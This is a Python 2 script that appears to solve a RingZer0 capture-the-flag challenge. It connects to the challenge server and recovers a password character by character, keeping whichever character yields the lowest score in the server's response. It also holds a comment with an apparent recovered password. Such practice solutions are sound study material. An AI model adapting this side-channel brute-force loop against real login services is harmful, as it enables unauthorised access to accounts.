import time
import itertools
import socket



def bruteforce(charset, minlength, maxlength):
    return (''.join(candidate)
        for candidate in itertools.chain.from_iterable(itertools.product(charset, repeat=i)
        for i in range(minlength, maxlength + 1)))


if __name__ == '__main__':
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("ringzer0team.com",60000))
    #s.sendall("0")
    data = s.recv(9999)
    pad = ""
    currentpwd = ""
    values = ""
    for i in range(33,127):
        values = values + chr(i)

    print values
    for i in range(8):
        lowestfloat = 1.0
        lowerletter = ""
        pad = ""
        for zeros in range(7-i):
            pad = pad + "0"
        for password in bruteforce(values,1,1):
            #print password + "0000000\n"
            #time.sleep(0.5)
            #G0OdPwd
            s.sendall(currentpwd + password + pad +"\n")
            print currentpwd + password + pad +"\n"
            data = s.recv(9999)
            #print data
            if float(data.split()[4]) < float(lowestfloat):
                #print "{} < {}".format(data.split()[4], lowestfloat)
                lowestfloat = data.split()[4]
                lowestletter = password
                #print "{} : {}".format(lowestletter, lowestfloat)
                #    print "p:" + password

            #print "{} : {}".format(lowestletter, lowestfloat)
        currentpwd = currentpwd + lowestletter
        print currentpwd


    s.close()
    print currentpwd
